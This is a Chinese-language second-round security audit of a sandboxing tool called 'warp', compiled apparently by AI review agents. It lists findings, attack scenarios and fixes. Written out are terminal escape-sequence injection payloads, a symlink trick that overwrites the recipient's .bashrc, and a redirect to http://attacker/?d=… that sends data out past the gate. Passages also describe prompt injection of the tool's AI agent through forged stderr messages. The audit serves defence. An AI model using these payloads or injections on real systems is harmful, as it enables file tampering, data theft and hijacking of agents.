# 11 第二輪獨立安全審查：交叉比對（2026-11-25）

對 commit `e59b5e5` 做的第二輪審查，目的是檢驗 [10 第一輪審查紀錄](10-security-review.md) 漏了什麼、修補有沒有破口。

方法：
- 四個互不知情的 AI 審查代理各自審查一份獨立的原始碼副本。副本裡移除了第一輪紀錄與 README 對它的引用，代理之間也看不到彼此的輸出。
- 四個代理的重點範圍不同：r1 沙箱／runner／netpolicy，r2 gate／manifest／diff／draft，r3 probe／watch／state／ledger／evidence／label／report，r4 整體信任邊界與 Agent 協定。原始報告在 [11-round2-reports/](11-round2-reports/)。
- 第五個 AI 代理把四份報告去重合併，逐項回原始碼查證，再與第一輪紀錄交叉比對，產出本文件。
- 所有代理都只能讀檔，不能執行程式。**本文件的判定全部只靠讀碼，沒有重現任何一項**；這一點與第一輪（實測重現）不同。
- 審查者是 AI，不能取代 [09](09-roadmap.md) Q5 要求的獨立人工審查。

文中的檔案位置省略了 `internal/` 前綴（例如 `label/label.go` 指 `internal/label/label.go`），行號對應 commit `e59b5e5`。

## 結論
1. 最需要先處理的是**殼外的信任鏈**，沙箱本身反而沒有被找到可用的逃逸。有三項高風險：作者交付的 `.warp/` 裡放 symlink，接收者一跑 `warp label` 就會覆寫自己的任意檔案（A2）；標籤、diff、重放、帳本輸出都不過濾終端控制字元，作者可以把危險權限從畫面上藏掉（A1，四位審查員都獨立找到）；`evidence replay` 在主機端跟隨應用給的重新導向，等於繞過閘門（A3）。
2. 第二輪合併後共 24 個根因。其中 **17 項是第一輪紀錄沒有的**（高 3、中 5、低 9），而且幾乎都落在第一輪沒審的範圍：label、report、watch、replay、CLI、lint。
3. 第一輪的修補有 **4 項被找到破口**，都屬於「只修了特例」：#5 上傳上限的計數鍵、#6 對內閘門的 GET 與 Set-Cookie、#7 SNI 檢查不涵蓋非 TLS 通道、#8 明文機密只擋 443 埠。
4. 沙箱核心的 #1–#3 修補，r1 和 r4 都在原始碼上確認仍然有效。
5. 以下判定全部只靠讀碼，沒有重現任何一項。凡是取決於終端機、瀏覽器或核心版本的效果，都已明確標註。

---

## A. 第二輪新發現（第一輪紀錄沒有）

| 編號 | 嚴重度 | 標題 | 位置 | 發現者 | 查證結果 |
|---|---|---|---|---|---|
| A1 | 高 | 標籤、diff、重放、帳本、即時通知都不過濾終端控制字元與換行 | `label/label.go:272-276,282,292-296,321,360,408-430`；`diff/diff.go:36`；`runner/replay.go:160,229`；`cmd/warp/main.go:359,431,555`；`gate/ingress.go:148,167`；`gate/egress.go:392,476,593` | r1 r2 r3 r4 | 已確認 |
| A2 | 高 | `.warp/` 內的 symlink 讓核心以接收者身分覆寫任意檔案 | `cmd/warp/main.go:353-355,395-402`；`report/report.go:105-114`；`runner/runner.go:892-895`；`manifest/util.go:156-162` | r1 r3 r4 | 已確認（覆寫）；能否變成程式碼執行無法只靠讀碼判定 |
| A3 | 高 | `evidence replay` 的主機端 HTTP client 跟隨應用的重新導向，形成殼外 SSRF 與外洩通道 | `runner/replay.go:165-179`；`runner/listen.go:73-75`；`gate/ingress.go:74-123` | r3 r4 | 已確認 |
| A4 | 中 | `evidence replay` 不跑 lint，直接套用宣告裡的 `lan: true` | `runner/replay.go:88-99`；`runner/runner.go:209-214,414-421`；`gate/egress.go:170-201` | r1 r2 | 部分成立（LAN 部分成立；萬用字元部分不成立，見 D） |
| A5 | 中 | 軟性規則不阻擋 enforce；例外可由寫 YAML 的一方自行填寫，標籤卻顯示「已列入例外」；公共後綴萬用字元只算軟性規則 | `manifest/lint.go:215-226,296-310,526-541`；`runner/runner.go:196`；`label/label.go:308-313` | r2 r4 | 部分成立 |
| A6 | 中 | 接收者實際只能走「對外不設限的側錄模式」；誘餌值前綴讓應用分辨得出自己在哪個模式 | `manifest/lint.go:603`；`gate/egress.go:170`；`runner/runner.go:410,427,438`；`runner/replay.go:125,161` | r4 | 已確認（設計層級） |
| A7 | 中 | enforce 不要求確認，機密真值從當下環境變數裡同名的變數隱式取得 | `runner/runner.go:423-433`；`cmd/warp/main.go:245-303`；`manifest/lint.go:103,392` | r2 r4 | 已確認 |
| A8 | 中 | 每日上傳上限以實際連線字串計數，可用萬用字元子網域、IP 不同寫法、規則重疊繞過 | `gate/egress.go:175-181,501,541,591,715`；`netpolicy/netpolicy.go:188-194`；`manifest/lint.go:259-263` | r2 | 已確認（同時是 #5 的破口，見 B） |
| A9 | 低 | 側錄監看器會跟隨殼內建立的 symlink，在主機上遞迴監看 | `watch/watch_linux.go:53-69,114-116` | r1 r3 r4 | 已確認（需贏得競態） |
| A10 | 低 | 報告沒有簽章；用 `enforce -- true` 就能拿到 L2；終端機標籤不顯示 enforce 跑的是什麼指令 | `label/label.go:199-224,343-350`；`report/report.go:132-156` | r1 r3 r4 | 部分成立 |
| A11 | 低 | `warp diff` 漏掉 `app.entry`、`triggered_by`、`author_note`、`data.flows` 等欄位；例外以索引為鍵 | `diff/diff.go:103-149` | r2 | 已確認 |
| A12 | 低 | 高風險工具名稱的內建下限可以繞過（`SEND_EMAIL`、`sendemail`、Cyrillic 字母） | `manifest/lint.go:106,430-440` | r2 | 已確認 |
| A13 | 低 | cgroup v2 沒有設定 `memory.swap.max` | `sandbox/cgroup_linux.go:54-57`（v1 有設 memsw，`:87`） | r1 | 已確認 |
| A14 | 低 | USER_PICK 的系統目錄檢查只比對完全相同的路徑，可以掛入 `/run/user/…`、`/tmp/.X11-unix` | `runner/paths.go:56-60,85-94` | r1 | 已確認（需要使用者自己選這種路徑） |
| A15 | 低 | `HasEgress` 不看 Decision，被擋下的連線也算證據、也算「重現」 | `evidence/trace.go:278-285` | r3 | 部分成立（「嘗試連線算不算證據」有語意爭議） |
| A16 | 低 | 狀態目錄沒驗證擁有者與權限；保護清單用的是未解析 symlink 的路徑 | `state/state.go:20-32,52`；`runner/runner.go:267-270` 對照 `paths.go:38-44` | r3 | 部分成立（需要特定設定或使用者配合） |
| A17 | 低 | 側錄檔讀取沒有大小上限（symlink 指向 `/dev/zero` 會耗盡記憶體） | `evidence/trace.go:163` | r4 | 已確認（只會讓本機 warp 當掉） |

### A1 終端控制字元注入（高）
- **攻擊情境：**
  - **作者端：** 惡意作者（T5）或被注入提示的 Fitter（T4），在 `purpose`、`display_name`、`version`、`author_note` 裡用 YAML 雙引號跳脫寫進 `\r`、`\n`、`\e[2K`、`\e[1A`、`\e[8m`。`warp label` 會原樣印出，於是可以把 `🌐 連線 evil.example:443` 重畫成 `api.openai.com`、抹掉「需要你特別注意」整段，或插入假的「✖ 不可以」條目。`warp diff` 的「＋ 新增…（用途：…）」也一樣。重放時，側錄檔的 argv（不驗簽章）會出現在「重放指令：」那一行。
  - **執行期（應用）：** 應用送出 `GET http://allowed/%1b[2J…` 或帶控制字元的 SNI，解碼後的 Path 或 SNI 會進入帳本 Detail 和即時通知，之後的 `ledger show` 會被注入。
  - **執行期（網頁）：** 對內閘門未帶權杖的請求會被 `notify` 印出解碼後的路徑（`ingress.go:167`）。所以本機任何網頁都能用 `<img src="http://127.0.0.1:<埠>/%1b]52;…">` 直接寫到接收者的終端機，不必經過應用。
- **根因：**
  - 輸入端：`parse.go:50-73` 和 lint 都不限制字元。purpose 只檢查空白與佔位字（`lint.go:142-148`），version 只檢查非空（`:158`），display_name、author_note 完全沒有檢查。
  - 輸出端：`row`／`wrap` 直接寫出字串（`label.go:272-276,408-430`）。`CommandString` 只加單引號，控制字元原封不動（`trace.go:239-252`）。帳本與通知用的是解碼後的 `r.URL.Path`。
- **修補建議：**
  - lint 對所有自由文字欄位（含 `reason`、`approved_by`、`triggered_by`）把 `\p{Cc}`、`\p{Cf}`（含 bidi 控制字元）列為硬性錯誤。
  - 加一個統一的「可見化」函式，套在 `Render`、diff、`PrintReplay`、`ledger show`、`notify`、`printFindings`。
  - 帳本改記 `EscapedPath()`；`CommandString` 對不可列印字元改用 `$'\x1b'` 形式；對內閘門的通知加頻率限制。
- **查證依據：** 上述各行。`label.json` 經 JSON 跳脫，不受影響（`main.go:352`），所以只有人看的終端機版本會被騙。實際視覺效果取決於終端機；yaml.v3 支援 `\e` 是依 YAML 1.2 規範判斷。瀏覽器的本機網路存取限制會不會擋下網頁那條路徑，無法只靠讀碼判定。

### A2 `.warp/` symlink 任意檔案覆寫（高）
- **攻擊情境：** 作者在交付物裡放 `.warp/label.json -> ../../.bashrc`，或讓 `.warp/reports` 指向別的目錄。接收者照流程執行 `warp label`、`probe` 或 `enforce`，核心就以接收者身分用 `os.WriteFile`（O_TRUNC、跟隨 symlink）覆寫目標。
  - `label` 即使宣告有 lint 錯誤也會先寫檔（`main.go:347-355`，錯誤要到 `:364` 才回報）。
  - 以 root 執行時可以直接指向 `/etc/ld.so.preload` 這類絕對路徑。
  - `draft` 遇到懸空 symlink 時，`os.Stat` 會失敗而改寫 `warp.yaml`，同樣會跟隨（`main.go:398-402`）。
  - `.warp` 不在內容雜湊範圍內（`util.go:156-162`），所以這些 symlink 不會改變 digest。
- **能否變成程式碼執行：** 寫入的 JSON 含作者可控字串，Go 的 JSON 不會跳脫反引號，寫進 `.bashrc` 理論上可以觸發命令替換。但 bash 怎麼解析整份 JSON（第一行 `{` 會開啟群組指令）會影響結果，**無法只靠讀碼判定**。覆寫與毀損本身是確定的。
- **根因：** 把作者可控的目錄當成核心自己的輸出目錄。唯一安全的是 `evidence.Write` 用了 `O_EXCL`（`trace.go:211`）。
- **修補建議：**
  - 標籤與報告改寫到 `state.AppDir`。
  - 如果一定要寫在 `.warp/`，用 `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` 或逐層 `O_NOFOLLOW|O_DIRECTORY`，先寫暫存檔再 rename。
  - lint 把 `.warp/` 內的任何 symlink 列為硬性錯誤。

### A3 replay 重新導向 SSRF（高）
- **攻擊情境：**
  1. 接收者照 README 第 101 行執行 `warp evidence replay`。
  2. 應用在殼內監聽一個埠，`pollListeners` 會開啟對內閘門並呼叫 `IngressNotify`（`listen.go:73-75`）。
  3. replay 用 `http.Client{Jar, Timeout}` 自動造訪一次，**沒有設定 `CheckRedirect`**（`replay.go:165-166,174`）。這個 client 跑在主機的網路命名空間。
  4. 對內閘門的反向代理把應用的 `Location` 原樣轉回（`ingress.go:74-123` 沒有 ModifyResponse）。
  5. 應用回 `302 Location: http://169.254.169.254/…`、`http://127.0.0.1:<本機服務>/…`、`http://attacker/?d=…`，核心就會在主機上發出最多 10 次 GET，完全不經過 `decide()`。
  6. cookie jar 不分連接埠，`warp_token_*` cookie 也會一起送往 127.0.0.1 的其他埠。
- **得到什麼：** 一條繞過閘門的外洩通道（資料放在 URL 裡），以及對主機本機、內網、雲端中繼資料位址的盲打 GET。
- **根因：** 殼外的 client 依照殼內不可信程式的回應決定下一步要連到哪裡。對照之下，`probe.go:257` 有正確設定 `ErrUseLastResponse`。
- **修補建議：** `CheckRedirect` 只放行同一個 `127.0.0.1:<HostPort>`；`DialContext` 固定只能連到該閘門的位址；e2e 加一個 302 測試。

### A4 replay 不跑 lint，套用 `lan: true`（中，部分成立）
- **攻擊情境：** `Replay` 只呼叫 `manifest.LoadFile`（`replay.go:88`），重放規則直接沿用宣告裡的 Host 和 LAN（`runner.go:419-421`）。`decide` 用 `rule.LAN` 放行私有位址（`egress.go:195-199`）。所以作者寫 `192.168.1.1` 或「解析到內網的自有網域」加上 `lan: true`，在接收者還沒看過任何標籤之前，作者的指令就能連到接收者的內網。
- **為什麼只是部分成立：** 報告中「`*.com` 可以連到任何 .com」那一半沒有增量，見 D。
- **修補建議：**
  - 重放前先跑 Lint，要求硬性規則全部通過（簽章相關的錯誤除外）。
  - **強制 LAN=false**。光跑 lint 不夠，因為「主機名稱加 `lan: true`」在 lint 只是軟性警告（`lint.go:350-352`）。

### A5 軟性規則不約束 enforce、例外可自行填寫、公共後綴萬用字元（中，部分成立）
- **攻擊情境：** enforce 只在 `Errors()>0` 時拒絕執行（`runner.go:196`）。`app-visible`、`lan: true`、`*.github.io` 都只是警告。`exceptions` 只檢查欄位非空（`lint.go:535`），補上之後標籤就改顯示「已列入例外」（`label.go:309`）。`*.co.uk`、`*.github.io` 只要基底至少有一個點就通過（`lint.go:302`）。
- **為什麼只是部分成立：** 文件 `04:155` 承認第 1 期沒有同意代理。但 `04:133`、`05:150`、`02:39` 仍宣稱「Agent 無法代簽」，標籤用語也讓人以為已經有人核可過。
- **修補建議：**
  - 標籤改顯示「作者自稱已核可（未驗證）」。
  - 未列入例外的軟性規則在 enforce 時要求 TTY 確認。
  - 嵌入 PSL（公共後綴清單），基底是公共後綴的萬用字元列為硬性錯誤。
  - 修正上述文件的文字。

### A6 接收者只能走不設限的側錄模式（中）
- **依據：**
  - 接收者機器的簽章金鑰不同，lint 必定報錯（`lint.go:603`），enforce 因此拒絕執行。
  - `record` 沒有任何限制對外連線的選項（`main.go:290-293`），閘門在 record 模式 `restricted=false`（`egress.go:170`）。
  - replay 產生的側錄檔寫在暫存目錄，結束就刪（`replay.go:125,161`），不能拿來當證據。
  - 誘餌值前綴三種模式各不相同：側錄 `warp-decoy-`（`runner.go:410`）、探測 `warp-canary-`（`:427`）、強制 `warp-placeholder-`（`:438`）。應用可以據此判斷自己在哪個模式，「審查時乖、交付後壞」。
- **修補建議：**
  - 已有 `.warp/warp.yaml` 時，`record` 預設套用 DeclaredOnly。
  - replay 產生的側錄檔可以簽章後留下來當證據。
  - 統一三種模式的佔位值格式。

### A7 隱式取用環境變數裡的機密（中）
- **依據：** enforce 直接 `os.Getenv(sec.Name)`（`runner.go:429`），沒有任何確認步驟（`main.go:245-303`）。
- **攻擊情境：** 機密取名 `GITHUB_TOKEN`，`bind.host` 設成作者自己的主機。接收者的 shell 裡剛好 export 了這個變數，真值就會被送出去。
- **現有的緩解：** 標籤會列出名稱與綁定主機（`label.go:126-128`）。但搭配 A1 就能把這一行藏掉。
- **修補建議：** 第一次執行某個宣告 SHA-256 時，在 TTY 上確認「機密 → 主機」對應；真值改用 `WARP_SECRET_<名稱>` 前綴或 `--secret-from` 明確指定。

### A8 每日上傳上限可以繞過（中）
- **依據：**
  - 計數鍵是實際連線的 `host:port`（`egress.go:501,541,591,715`）。`NormalizeHost` 不會把 IP 正規化（`netpolicy.go:188-194`），但 `hostEqual` 會先 Unmap 再比對（`egress.go:146`）。所以 `[::ffff:8.8.8.8]` 這類不同寫法會各自拿到一份額度。
  - 萬用字元規則底下，每個子網域各自計數。
  - `decide` 取第一條符合的規則（`egress.go:175-181`），lint 只擋完全相同的 `host:port`（`lint.go:259-263`）。所以「`*.example.com` 沒上限」排在「`api.example.com` 1M」前面時，標籤顯示有上限，實際上沒有。
- **修補建議：** 計數鍵改用 `rule.Grant`；IP 一律 `Unmap().String()`；lint 對重疊的規則報錯。

---

## B. 與第一輪重疊的發現

| 第一輪項目 | 第二輪對應 | 判定 |
|---|---|---|
| §1 #1 `/proc/sys` 可寫 | r1、r4 列為「檢查過沒問題」（`init_linux.go:625` 唯讀清單） | 修補仍有效 |
| §1 #2 session keyring | r1、r4 確認（`init_linux.go:228`） | 修補仍有效 |
| §1 #3 控制 socket 漏進殼內 | r1 確認 `cloexecInherited`（`init_linux.go:163`） | 修補仍有效 |
| §1 #4 標頭大小上限 | r2、r3、r4 確認 1 MiB 上限（`egress.go:268`）；r1 指出「每條 1 MiB × 連線數不限」 | 修補有效，殘餘風險歸 §3 #6 |
| **§1 #5 上傳上限** | A8（r2） | **修補不完整**：標頭和請求列已計入，但計數鍵、IP 正規化、規則重疊都沒處理 |
| **§1 #6 對內閘門 cookie／Origin** | r1、r2：no-cors 的 GET 不帶 Origin，只在有 Origin 時才擋（`ingress.go:146`），可做盲目的 CSRF；另一個殼的應用可用 `Set-Cookie: warp_token_<B 的埠>` 蓋掉 B 的權杖，回應路徑沒有剝除（`ingress.go:74-123`） | **修補不完整**（程式路徑已確認；瀏覽器實際行為無法只靠讀碼判定）。建議檢查 `Sec-Fetch-Site`，並在回應路徑剝除 `warp_token_*` |
| **§1 #7 沒有 SNI 也能通過** | r2、r4：第一個位元組不是 0x16 就當作非 TLS 直接放行（`sni.go:40-41`），非 TLS 的 CONNECT 通道沒有任何 Host 檢查（`egress.go:381-418`；Host 檢查只在 `forward()` 的 `:502-510`） | **修補不完整**（低）。TLS 內層 Host 與 ECH 屬於閘門本質上看不到的部分，應在文件誠實註明 |
| **§1 #8 明文機密送往 443** + §3 #3 | r1、r2、r4：只擋 `scheme=="http" && port==443`（`egress.go:561`）；`:8443`、`:80` 照樣以明文注入真值 | **修補不完整**，第一輪 §3 #3 已預告。建議改成只在 https 上注入 |
| §1 #9 Azure WireServer | 沒有人提到 | 見 C |
| §3 #1 以 root 執行較弱 | 沒有人當成發現；r4 在 A2 提到 root 時可覆寫 `/etc/ld.so.preload` | 見 C |
| §3 #2 沒有 seccomp | r1：沒有 socket 家族過濾，AF_VSOCK 可能繞過網路命名空間 | 沒有 seccomp 已確認（`internal/` 中找不到任何 seccomp）；vsock 是否受網路命名空間隔離取決於核心版本，**無法只靠讀碼判定** |
| §3 #4 帳本中途寫不進去只警告 | r2、r3：`Log` 只印警告（`ledger.go:236-243`）；應用可經由 APP_DATA 寫滿同一個檔案系統（`runner.go:319,740`）來觸發；寫了半行之後 `lastEntry` 無法解析（`ledger.go:172-173`），之後每次 `run start` 都會失敗（`runner.go:755-757`），變成永久拒絕執行 | 已確認，並**多了一條由應用主動觸發的路徑** |
| §3 #5 Range 拆分繞過遮蔽 | 沒有人找到 | 見 C |
| §3 #6 連線數沒有上限 | r1：另外指出沒有設定 `RLIMIT_NOFILE`（`runner.go:567-570`） | 已確認（`egress.go:109-121`） |
| §3 #7 應用可輸出控制序列 | r4：核心訊息（`runner.go:134-136`）與應用輸出共用同一個 stderr（`shell_linux.go:71`），應用可以偽造 `warp：…` 訊息對 Agent 做提示注入；r3：網頁也能經由對內閘門的通知寫入終端機（併入 A1） | 已確認，**是新的影響面**（Agent 會讀這些輸出，而 SKILL.md 沒把應用輸出列為不可信資料） |

---

## C. 第一輪有、第二輪沒有人找到的項目

| 項目 | 可能原因 |
|---|---|
| §1 #9 Azure WireServer | 已修補所以看不到（`netpolicy.go:56`）；r1、r2 只籠統寫「中繼資料位址已處理」 |
| §3 #1 以 root 執行仍較弱 | 審查員漏看或視為已知：r1 的範圍涵蓋這一塊，但只確認了 `/proc` 加固 |
| §3 #5 用 Range 拆分繞過機密遮蔽 | 審查員漏看：r2 的範圍是 gate，但只寫「遮蔽跨區塊也比對得到」，沒有考慮跨回應的情況 |
| §1 #1–#3 的原始漏洞 | 已修補所以看不到（見 B，修補仍有效） |

---

## D. 第二輪被判定不成立的發現

| 標題 | 提出者 | 不成立的理由 |
|---|---|---|
| replay 不跑 lint，所以 `*.com` 這類萬用字元可以連到任何 .com 主機 | r1、r2 | 沒有增量風險：一般的 `warp record`（接收者本來就必須跑，見 A6）本來就允許任何公開主機（`egress.go:170`，record 模式且沒有 RecordOnly 時 `restricted=false`）。真正多出來的只有 LAN（A4） |
| 作者附上偽造的 `.warp/reports` 就能讓接收者的標籤顯示「L2 已驗證」 | r1 | 一般接收者流程下不成立：簽章金鑰不同，lint 必定有錯（`lint.go:603`），`label.go:218` 會先判為「未達 L1」。偽造報告只能影響驗證列和資源列（`label.go:199-210` 不看 lint 結果），這部分併入 A10 |
| 機密名稱可以覆寫殼內的 `PATH`、`HTTPS_PROXY`、`SSL_CERT_FILE` | r2（後半段） | 不是安全問題：`secretEnv` 只影響應用自己的環境（`runner.go:551-553`），應用本來就能自己設定這些變數；網路限制靠網路命名空間，不靠環境變數。剩下的實質風險（拿到主機上同名變數的值）已併入 A7 |

---

## E. 兩輪都認為沒問題的地方，以及仍未被任何一輪覆蓋的範圍

**兩輪都認為沒問題的地方：**
- **沙箱本體：** 命名空間、pivot_root、清空 capability、no_new_privs、init 不可 dump（`init_linux.go:87`）、`Setsid` 阻擋 TIOCSTI（`:246`）、巢狀使用者命名空間被關閉（`:493`）。
- **對外閘門的位址判斷：** 先解析、檢查每個位址、再直接連那個 IP；涵蓋 IPv4 對映、NAT64、6to4、Teredo；transport 的 `Proxy: nil`；上游的轉址不會被自動跟隨；無法解開的內容編碼在有機密時會被擋下。
- **本機 CA：** 私鑰只存在記憶體，帶 X.509 名稱限制。
- **不支援的功能一律 fail-closed：** `checkSupported`（`runner.go:228-244`）；非 Linux 平台直接拒絕執行（`shell_other.go:45-48`）。
- **只有第二輪看過、但也認為沒問題：** 帳本雜湊鏈與尾端錨點（r3）、側錄檔 HMAC 與 `O_EXCL` 寫入（r3、r4）、YAML 封閉格式（r2、r4）。

**仍未被任何一輪覆蓋的範圍：**
- 應用與閘門之間的 HTTP 請求走私／chunked 解析差異。
- `internal/probe/agent_linux.go` 探針代理的內部邏輯（r3 只看了結果的交叉驗證）。
- `usage-*.json` 用量檔的完整性：狀態目錄內的檔案沒有簽章。
- cgroup v1 的細節，以及訊號轉送與 Pdeathsig 的競態。
- 只能靠動態測試確認的部分：實際的終端機與瀏覽器行為、vsock 在不同核心版本的表現、yaml.v3 的跳脫行為。
- `skills/warp-fitter/SKILL.md` 全文對抗式審查：只有 r4 部分涉及。

---

## F. 建議的處理順序
1. **A2：** 標籤與報告移到狀態目錄；`.warp/` 的寫入一律使用 `RESOLVE_NO_SYMLINKS`；lint 拒絕 `.warp/` 內的 symlink。
2. **A1：** lint 對自由文字欄位禁止 Cc/Cf 字元；所有面向終端機的輸出統一經過可見化處理；帳本改記跳脫後的路徑。
3. **A3：** replay 的 client 加上 `CheckRedirect`，並把撥號目標固定為對內閘門。
4. **A4 + A6：** replay 先跑 lint 並強制 `LAN=false`；`record` 在已有宣告時預設只允許宣告中的目的地；統一三種模式的佔位值格式。
5. **A7 + A5：** enforce 第一次執行時，在 TTY 上確認機密與例外；機密真值改用專用來源；標籤改成「作者自稱已核可（未驗證）」；公共後綴萬用字元列為硬性錯誤。
6. **#8 / §3 #3：** 機密只在 https（閘門已終止 TLS）上注入，明文請求帶佔位值一律拒絕。
7. **§3 #4：** 帳本寫入失敗時中止殼（fail-closed）；寫入失敗時截回原長度；APP_DATA 加上配額。
8. **A8、#6、#7、§3 #6 與 §3 #2：** 上傳計數鍵改用授權並正規化 IP；對內閘門檢查 `Sec-Fetch-Site` 並剝除應用設定的權杖 cookie；非 TLS 的 CONNECT 改走 `forward()`；加上連線數上限與 `RLIMIT_NOFILE`；中期導入 seccomp（socket 家族白名單）。
